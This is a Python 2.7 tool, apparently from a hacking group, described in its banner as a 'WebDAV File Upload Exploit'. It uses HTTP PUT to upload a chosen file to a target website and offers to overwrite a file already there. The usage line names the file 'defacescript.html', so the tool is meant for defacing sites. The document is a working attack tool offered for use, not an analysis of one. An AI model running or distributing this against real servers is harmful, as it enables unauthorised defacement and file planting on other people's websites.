#!/usr/bin/python2.7

import requests
import string
import random
import sys
import os

os.system("clear")

print """\033[93m
 __      __      ___.   ________      _________   ____
/  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /
\   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / 
 \        /\  ___/| \_\ \|    `   \/    |    \     /  
  \__/\  /  \___  >___  /_______  /\____|__  /\___/   
       \/       \/    \/        \/         \/         \033[0m"""

B = '\033[1;34m'
G = '\033[1;32m'
R = '\033[31m'
N = '\033[0m'

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  defacescript = '/'+sys.argv[2]


  print(B+"[*]"+N+" Upload File Name: %s") % (sys.argv[2])
  print(B+"[*]"+N+" Uploading Script: %d bytes") % len(script)
  try:
      r = requests.request('put', host + defacescript, data=script, headers={'Content-Type':'application/octet-stream'})

      if r.status_code < 200 or r.status_code >= 300:
         print(R+"[!]"+N+" Upload failed . . .")
         sys.exit(1)
      else:
         print(G+"[+]"+N+" File uploaded . . .")
         print(G+"[+]"+N+" PATH: "+host + defacescript)
  except requests.exceptions.MissingSchema:
     print(R+"[!]"+N+" needed link: http://example.com Error: Missing Schema")
  except requests.exceptions.InvalidSchema:
     print(R+"[!]"+N+" Error: Invalid Schema")
  except requests.exceptions.SSLError:
     print(R+"[!]"+N+" Error: SSL Error")
  except requests.exceptions.URLRequired:
     print(R+"[!]"+N+" Error: URL Required")
  except requests.exceptions.HTTPError:
     print(R+"[!]"+N+" Error: HTTP Error")
  except requests.exceptions.ProxyError:
     print(R+"[!]"+N+" Error: Proxy Error")
  except requests.exceptions.ConnectionError:
     print(R+"[!]"+N+" Error: Connection Error")
  except requests.exceptions.Timeout:
     print(R+"[!]"+N+" Error: Timeout")
  except requests.exceptions.ConnectTimeout:
     print(R+"[!]"+N+" Error: Connect Timeout")
  except requests.exceptions.ReadTimeout:
     print(R+"[!]"+N+" Error: Read Timeout")
  except requests.exceptions:
     print(R+"[!]"+N+" Error: Unknown Error")
  except KeyboardInterrupt:
     print(R+"[!]"+N+" Error: Keyboard Interrupt")
  except IOError:
     print(R+"[!]"+N+" Error: Something went wrong")

def cekfile():
  print """
{B}[*]{N} WebDAV File Upload Exploit
{B}[*]{N} Coded in: Python2.7
{B}[*]{N} Developer: AndroSec1337 Cyber Team
{B}[*]{N} Modded By: #pH.[3]xpl01t
{B}[*]{N} Thx To Tu5b0l3d IndoXploit For PHP Exploit
""".format(B = B, N = N)
  print(B+"[*]"+N+" Check file on: "+sys.argv[1]+"/"+sys.argv[2])
  try:
      r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
      if r.status_code == requests.codes.ok:
         print(B+"[*]"+N+" On Find Similar Files On Target . . .")
         tanya = raw_input(R+"[!]"+N+" Replace File Target ? [Y/N] > ")
         if tanya == "Y":
            webdav()
         else:
            print(R+"[!]"+N+" Exiting Tools . . .")
            sys.exit()
      else:
         print(B+"[*]"+N+" File Ga Di Target . . .")
         print(B+"[*]"+N+" Processing Upload Script . . .")
         webdav()
  except requests.exceptions.MissingSchema:
     print(R+"[!]"+N+" needed link: http://example.com Error: Missing Schema")
  except requests.exceptions.InvalidSchema:
     print(R+"[!]"+N+" Error: Invalid Schema")
  except requests.exceptions.SSLError:
     print(R+"[!]"+N+" Error: SSL Error")
  except requests.exceptions.URLRequired:
     print(R+"[!]"+N+" Error: URL Required")
  except requests.exceptions.HTTPError:
     print(R+"[!]"+N+" Error: HTTP Error")
  except requests.exceptions.ProxyError:
     print(R+"[!]"+N+" Error: Proxy Error")
  except requests.exceptions.ConnectionError:
     print(R+"[!]"+N+" Error: Connection Error")
  except requests.exceptions.Timeout:
     print(R+"[!]"+N+" Error: Timeout")
  except requests.exceptions.ConnectTimeout:
     print(R+"[!]"+N+" Error: Connect Timeout")
  except requests.exceptions.ReadTimeout:
     print(R+"[!]"+N+" Error: Read Timeout")
  except requests.exceptions:
     print(R+"[!]"+N+" Error: Unknown Error")
  except KeyboardInterrupt:
     print(R+"[!]"+N+" Error: KeyboardInterrupt")
  except IOError:
     print(R+"[!]"+N+" Error: Something went wrong")

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" http://site.com defacescript.html\n")
    sys.exit(0)
  else:
    cekfile()